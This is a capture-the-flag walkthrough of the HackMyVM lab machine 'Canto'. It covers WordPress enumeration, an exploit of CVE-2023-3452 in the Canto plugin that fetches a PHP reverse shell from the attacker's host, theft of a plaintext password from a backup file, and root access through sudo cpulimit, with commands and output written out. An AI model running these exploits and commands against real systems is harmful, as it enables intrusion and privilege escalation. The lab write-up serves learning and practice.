| Name | Difficulty | OS    | Target IP     | Link                                              |
| ---- | ---------- | ----- | ------------- | ------------------------------------------------- |
| Gift | Easy       | Linux | 192.168.0.118 | https://hackmyvm.eu/machines/machine.php?vm=Canto |
### ARP Scan

```bash
garffff@garffff:~/hackmyvm/canto$ sudo arp-scan -l | grep ef          
192.168.0.79	08:00:27:d5:bc:ef	PCS Systemtechnik GmbH
```

### Nmap Scan Results

```bash
garffff@garffff:~/hackmyvm/canto$ sudo nmap -p- -sV -sC 192.168.0.79 -oA nmap/canto.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-31 18:05 BST
Nmap scan report for 192.168.0.79
Host is up (0.000085s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
|_http-generator: WordPress 6.5.3
|_http-server-header: Apache/2.4.57 (Ubuntu)
|_http-title: Canto
MAC Address: 08:00:27:D5:BC:EF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
```

From the scan results, port 80 is using `WordPress 6.5.3`. For an easy win, I had a quick look using Searchsploit for this version number but there was nothing related to WordPress for this version:

```bash
garffff@garffff:~/hackmyvm/canto$ searchsploit 6.5.3

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
GNU groff 1.11 a / HP-UX 10.0/11.0 / SGI IRIX 6.5.3 - Malicious Manpage                                                                                                                                     | multiple/local/19430.txt
KingView 6.5.3 - SCADA HMI Heap Overflow                                                                                                                                                                    | windows/remote/15957.py
KingView 6.5.3 SCADA - ActiveX                                                                                                                                                                              | windows/remote/16936.html
Novell Groupwise Client 6.5.3 - Local Integer Overflow                                                                                                                                                      | windows/dos/26301.txt
PostgreSQL 6.3.2/6.5.3 - Cleartext Passwords                                                                                                                                                                | immunix/local/19875.txt
SmartHouse Webapp 6.5.33 - Cross-Site Request Forgery                                                                                                                                                       | php/webapps/47730.txt
VMware Player / VMware Workstation 6.5.3 - 'VMware-authd' Remote Denial of Service                                                                                                                          | windows/dos/33271.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

### Exploring port 80

Nothing much here, all the links are dead:

![[Pasted image 20240731180850.png]]

I will use WPScan to enumerate this WordPress site further

```bash
garffff@garffff:~/hackmyvm/canto$ wpscan --url http://192.168.0.79 --enumerate u,ap,at,cb,dbe --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.0.79/ [192.168.0.79]
[+] Started: Wed Jul 31 18:13:52 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.0.79/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.0.79/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.0.79/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.0.79/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Fingerprinting the version - Time: 00:00:01 <=============================================================================================================================================================> (702 / 702) 100.00% Time: 00:00:01
[i] The WordPress version could not be detected.

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.0.79/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://192.168.0.79/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | [!] Directory listing is enabled
 | Style URL: http://192.168.0.79/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.0.79/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:07 <========================================================================================================================================================> (106185 / 106185) 100.00% Time: 00:01:07
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.0.79/wp-content/plugins/akismet/
 | Last Updated: 2024-07-10T22:16:00.000Z
 | Readme: http://192.168.0.79/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.3.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.0.79/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.0.79/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.0.79/wp-content/plugins/akismet/readme.txt

[+] canto
 | Location: http://192.168.0.79/wp-content/plugins/canto/
 | Last Updated: 2024-07-17T04:18:00.000Z
 | Readme: http://192.168.0.79/wp-content/plugins/canto/readme.txt
 | [!] The version is out of date, the latest version is 3.0.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.0.79/wp-content/plugins/canto/, status: 200
 |
 | Version: 3.0.4 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.0.79/wp-content/plugins/canto/readme.txt
 | Confirmed By: Composer File (Aggressive Detection)
 |  - http://192.168.0.79/wp-content/plugins/canto/package.json, Match: '3.0.4'

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:17 <==========================================================================================================================================================> (27874 / 27874) 100.00% Time: 00:00:17
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyfour
 | Location: http://192.168.0.79/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://192.168.0.79/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | [!] Directory listing is enabled
 | Style URL: http://192.168.0.79/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://192.168.0.79/wp-content/themes/twentytwentyfour/, status: 200
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.0.79/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] twentytwentythree
 | Location: http://192.168.0.79/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://192.168.0.79/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 | Style URL: http://192.168.0.79/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.0.79/wp-content/themes/twentytwentythree/, status: 200
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.0.79/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.4'

[+] twentytwentytwo
 | Location: http://192.168.0.79/wp-content/themes/twentytwentytwo/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://192.168.0.79/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://192.168.0.79/wp-content/themes/twentytwentytwo/style.css
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.0.79/wp-content/themes/twentytwentytwo/, status: 200
 |
 | Version: 1.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.0.79/wp-content/themes/twentytwentytwo/style.css, Match: 'Version: 1.7'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=====================================================================================================================================================================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] erik
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.0.79/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jul 31 18:15:32 2024
[+] Requests Done: 134992
[+] Cached Requests: 646
[+] Data Sent: 35.856 MB
[+] Data Received: 18.188 MB
[+] Memory used: 498.207 MB
[+] Elapsed time: 00:01:39
```

From the scan results, we see two interesting things from the output

- A user called Erik
- The Canto plugin version is out of date

Judging by the name of this box, the plugin seems to be the way to go.

```bash
[+] canto
 | Location: http://192.168.0.79/wp-content/plugins/canto/
 | Last Updated: 2024-07-17T04:18:00.000Z
 | Readme: http://192.168.0.79/wp-content/plugins/canto/readme.txt
 | [!] The version is out of date, the latest version is 3.0.9
```

Searching Searchsploit for a exploit:

```bash
garffff@garffff:~/hackmyvm/canto$ searchsploit canto
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
NetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)                                                                                                                                         | windows/dos/45095.py
Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)                                                                                                                                                 | multiple/webapps/49189.txt
Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)                                                                                                                | php/webapps/51826.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Looking at the change log within the readme.txt file, it appears that Canto is using 3.0.4:

![[Pasted image 20240731181938.png]]

This matches the exploit found from Searchsploit. I will copy this exploit to my working directory:

```bash
garffff@garffff:~/hackmyvm/canto$ searchsploit -x php/webapps/51826.py
  Exploit: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51826
     Path: /snap/searchsploit/511/opt/exploitdb/exploits/php/webapps/51826.py
    Codes: N/A
 Verified: False
File Type: <missing file package>
garffff@garffff:~/hackmyvm/canto$ cp /snap/searchsploit/511/opt/exploitdb/exploits/php/webapps/51826.py .
```

### CVE-2023-3452 

The vulnerability has been labled as `CVE-2023-3452`. By the exploits own description `Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress`

Viewing the help menu of the exploit: 

```bash
garffff@garffff:~/hackmyvm/canto$ python3 51826.py -h
usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]

Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Vulnerable URL
  -s SHELL, --shell SHELL
                        Local file for web shell
  -LHOST LOCAL_HOST, --local_host LOCAL_HOST
                        Local web server IP
  -LPORT LOCAL_PORT, --local_port LOCAL_PORT
                        Local web server port
  -c COMMAND, --command COMMAND
                        Command to execute on the target
  -NC_PORT NC_PORT, --nc_port NC_PORT
                        Listener port for netcat

    Examples:
    - Check the vulnerability
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33

    - Execute a command
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'

    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
    
usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]

Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Vulnerable URL
  -s SHELL, --shell SHELL
                        Local file for web shell
  -LHOST LOCAL_HOST, --local_host LOCAL_HOST
                        Local web server IP
  -LPORT LOCAL_PORT, --local_port LOCAL_PORT
                        Local web server port
  -c COMMAND, --command COMMAND
                        Command to execute on the target
  -NC_PORT NC_PORT, --nc_port NC_PORT
                        Listener port for netcat

    Examples:
    - Check the vulnerability
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33

    - Execute a command
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'

    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
```

The exploit seems straightforward enough.  We need to give it a target URL, a local host IP and we can give it a reverse shell php file. I will use the `php-reverse-shell.php` php file found in Seclists:

```bash
garffff@garffff:~/hackmyvm/canto$ cp /opt/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php . 
garffff@garffff:~/hackmyvm/canto$ cp php-reverse-shell.php shell.php
garffff@garffff:~/hackmyvm/canto$ subl shell.php 
```

I updated the file to include my own IP address:

![[Pasted image 20240731182555.png]]

And also started a netcat listener:

```bash
garffff@garffff:~/hackmyvm/canto$ sudo nc -lvp 8888
Listening on 0.0.0.0 8888
```

### Using the Exploit

The exploit can be execute by issuing the following command:

```bash
garffff@garffff:~/hackmyvm/canto$ python3 51826.py -u http://192.168.0.79 -LHOST 192.168.0.51 -s shell.php
Exploitation URL: http://192.168.0.79/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.0.51:8080&cmd=whoami
Local web server on port 8080...
nc: getaddrinfo: Servname not supported for ai_socktype
192.168.0.79 - - [31/Jul/2024 18:29:36] "GET /wp-admin/admin.php HTTP/1.1" 200 -
```

And a reverse connection is received:

```bash
garffff@garffff:~/hackmyvm/canto$ sudo nc -lvp 8888
Listening on 0.0.0.0 8888
Connection received on 192.168.0.79 48894
Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 17:30:46 up 28 min,  0 user,  load average: 0.02, 0.06, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrading the STTY interface:

```bash
$ whereis python3
python3: /usr/bin/python3 /usr/lib/python3 /etc/python3 /usr/share/python3 /usr/share/man/man1/python3.1.gz
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@canto:/$ ^Z
[1]+  Stopped                 sudo nc -lvp 9999
garffff@garffff:~/hackmyvm/canto$ stty raw -echo
sudo nc -lvp 9999ackmyvm/canto$ 


www-data@canto:/$
```

Exploring the /home directory, we see a folder for the user `erik`, but we can't read the flag.txt:

```bash
www-data@canto:/$ ls -lash /home
ls -lash /home
total 12K
4.0K drwxr-xr-x  3 root root     4.0K May 12 14:24 .
4.0K drwxr-xr-x 20 root root     4.0K May 12 10:49 ..
4.0K drwxr-xr--  5 erik www-data 4.0K May 12 13:56 erik
www-data@canto:/$ cd /home/erik
cd /home/erik
www-data@canto:/home/erik$ ls -lash
ls -lash
total 36K
4.0K drwxr-xr-- 5 erik www-data 4.0K May 12 13:56 .
4.0K drwxr-xr-x 3 root root     4.0K May 12 14:24 ..
   0 lrwxrwxrwx 1 root root        9 May 12 13:56 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
4.0K -rw-r--r-- 1 erik erik     3.7K Jan  7  2023 .bashrc
4.0K drwx------ 2 erik erik     4.0K May 12 12:21 .cache
4.0K drwxrwxr-x 3 erik erik     4.0K May 12 12:03 .local
4.0K -rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
4.0K drwxrwxr-x 2 erik erik     4.0K May 12 17:22 notes
4.0K -rw-r----- 1 root erik       33 May 12 12:22 user.txt
www-data@canto:/home/erik$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

There is a notes folder that we have access to. Looking inside of the folder:

```bash
www-data@canto:/home/erik$ ls -lash notes
ls -lash notes
total 16K
4.0K drwxrwxr-x 2 erik erik     4.0K May 12 17:22 .
4.0K drwxr-xr-- 5 erik www-data 4.0K May 12 13:56 ..
4.0K -rw-rw-r-- 1 erik erik       68 May 12 12:07 Day1.txt
4.0K -rw-rw-r-- 1 erik erik       71 May 12 17:22 Day2.txt
```

And reading those text files, it would appear we are looking for a backups folder:

```bash
www-data@canto:/home/erik$ cat notes/Day1.txt
cat notes/Day1.txt
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik$ cat notes/Day2.txt
cat notes/Day2.txt
I almost lost the database with my user so I created a backups folder.
```

Searching for a backups folder:

```bash
www-data@canto:/home/erik$ find / -type d -name backups 2>/dev/null
find / -type d -name backups 2>/dev/null
/snap/core22/1380/var/backups
/snap/core22/864/var/backups
/var/backups
/var/wordpress/backups
```

The WordPress one looks interesting. Viewing its contents:

```bash
www-data@canto:/home/erik$ ls -lash /var/wordpress/backups
ls -lash /var/wordpress/backups
total 12K
4.0K drwxr-xr-x 2 root root 4.0K May 12 17:15 .
4.0K drwxr-xr-x 3 root root 4.0K May 12 17:14 ..
4.0K -rw-r--r-- 1 root root  185 May 12 17:14 12052024.txt
```

And reading the found file, we discover a password:

```bash
www-data@canto:/home/erik$ cat /var/wordpress/backups/12052024.txt
cat /var/wordpress/backups/12052024.txt
------------------------------------
| Users	    |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------
```

I will login via ssh using erik and this new password:

```bash
garffff@garffff:~/hackmyvm/canto$ ssh erik@192.168.0.79
erik@192.168.0.79's password: 
Welcome to Ubuntu 23.10 (GNU/Linux 6.5.0-28-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jul 31 05:40:52 PM UTC 2024

  System load:             0.01
  Usage of /:              41.1% of 8.02GB
  Memory usage:            20%
  Swap usage:              0%
  Processes:               115
  Users logged in:         0
  IPv4 address for enp0s3: 192.168.0.79
  IPv6 address for enp0s3: 2a00:23c6:2989:ca01:a00:27ff:fed5:bcef


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun May 12 17:19:50 2024 from 192.168.1.163
erik@canto:~$ whoami && id
erik
uid=1001(erik) gid=1001(erik) groups=1001(erik)
erik@canto:~$ 
```

And now we can read the first flag:

```bash
erik@canto:~$ ls -lash
total 36K
4.0K drwxr-xr-- 5 erik www-data 4.0K May 12 13:56 .
4.0K drwxr-xr-x 3 root root     4.0K May 12 14:24 ..
   0 lrwxrwxrwx 1 root root        9 May 12 13:56 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
4.0K -rw-r--r-- 1 erik erik     3.7K Jan  7  2023 .bashrc
4.0K drwx------ 2 erik erik     4.0K May 12 12:21 .cache
4.0K drwxrwxr-x 3 erik erik     4.0K May 12 12:03 .local
4.0K drwxrwxr-x 2 erik erik     4.0K May 12 17:22 notes
4.0K -rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
4.0K -rw-r----- 1 root erik       33 May 12 12:22 user.txt
erik@canto:~$ cat user.txt 
d41d8cd98f00b204e9800998ecf8427e
```

### Privilege Escalation

Issuing sudo -l, we discover that it is possible to run the `cpulimit` command as sudo with no password:

```bash
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
```

Searching GTFOBins https://gtfobins.github.io/gtfobins/cpulimit/ a privilege escalation method is discovered for cpulimit:

![[Pasted image 20240731184427.png]]

I will use bash instead of sh:

```bash
erik@canto:~$ sudo cpulimit -l 100 -f /bin/bash
Process 1904 detected
root@canto:/home/erik# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

And the root flag can be read:

```bash
root@canto:/home/erik# ls -lash /root
total 32K
4.0K drwx------  5 root root 4.0K May 12 13:54 .
4.0K drwxr-xr-x 20 root root 4.0K May 12 10:49 ..
   0 lrwxrwxrwx  1 root root    9 May 12 13:54 .bash_history -> /dev/null
4.0K -rw-r--r--  1 root root 3.1K Oct 17  2022 .bashrc
4.0K drwxr-xr-x  3 root root 4.0K May 12 11:12 .local
   0 lrwxrwxrwx  1 root root    9 May 12 13:54 .mysql_history -> /dev/null
4.0K -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4.0K -rw-r--r--  1 root root   33 May 12 13:50 root.txt
4.0K drwx------  3 root root 4.0K May 12 11:04 snap
4.0K drwx------  2 root root 4.0K May 12 11:04 .ssh
   0 -rw-r--r--  1 root root    0 May 12 11:08 .sudo_as_admin_successful
root@canto:/home/erik# cat /root/root.txt
1b56eefaab2c896e57c874a635b24b49
```

